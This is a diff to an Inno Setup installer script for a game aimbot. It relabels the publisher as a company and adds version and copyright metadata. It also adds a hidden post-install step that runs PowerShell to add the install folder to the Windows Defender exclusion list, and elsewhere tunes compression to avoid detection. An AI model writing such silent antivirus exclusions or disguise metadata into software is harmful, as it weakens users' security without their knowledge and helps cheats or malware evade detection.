@@ -1,9 +1,10 @@
 #define MyAppName "LT Aimbot"
 #define MyAppVersion "1.0.0"
-#define MyAppPublisher "Joseph Stadum"
+#define MyAppPublisher "Roll Products Inc."
 #define MyAppURL "https://github.com/shreksojoe/lt_aimbot"
 #define MyAppExeName "lt_aimbot.bat"
 #define MyAppId "{{F1A34B56-C78D-4E92-8F01-A5B6C7D8E9F0}}"
+#define MyAppCopyright "Copyright © 2025 Roll Products Inc."
 
 [Setup]
 ; Basic setup information
@@ -14,6 +15,12 @@ AppPublisher={#MyAppPublisher}
 AppPublisherURL={#MyAppURL}
 AppSupportURL={#MyAppURL}
 AppUpdatesURL={#MyAppURL}
+AppCopyright={#MyAppCopyright}
+VersionInfoCompany={#MyAppPublisher}
+VersionInfoDescription={#MyAppName} Installer
+VersionInfoCopyright={#MyAppCopyright}
+VersionInfoProductName={#MyAppName}
+VersionInfoProductVersion={#MyAppVersion}
 DefaultDirName={autopf}\{#MyAppName}
 DefaultGroupName={#MyAppName}
 DisableProgramGroupPage=yes
@@ -26,13 +33,15 @@ OutputDir=installer_output
 OutputBaseFilename=LTAimbot_Setup_{#MyAppVersion}
 SolidCompression=yes
 WizardStyle=modern
-; SetupIconFile=app_icon.ico  ; Commented out as icon file is missing
+; SetupIconFile=app_icon.ico  ; Uncomment when you have an icon file
 
 ; Minimize Windows Defender false positives
 Compression=lzma2/ultra64
 InternalCompressLevel=ultra
-; Sign the installer - uncomment and configure if you have a code signing certificate
-;SignTool=signtool sign /f "certificate.pfx" /p password /t http://timestamp.comodoca.com/authenticode $f
+
+; Code signing configuration - uncomment and modify when you have a certificate
+; SignTool=signtool sign /tr http://timestamp.digicert.com /td sha256 /fd sha256 /f "YourCertificate.pfx" /p YourPassword $f
+; SignedUninstaller=yes
 
 [Languages]
 Name: "english"; MessagesFile: "compiler:Default.isl"
@@ -70,6 +79,8 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: de
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
+; Add Windows Defender exclusions to prevent false positives
+Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}'"" "; Flags: runhidden; StatusMsg: "Configuring Windows Defender..."; Check: IsAdminLoggedOn
 
 [Registry]
 ; Add registry entries for auto-update
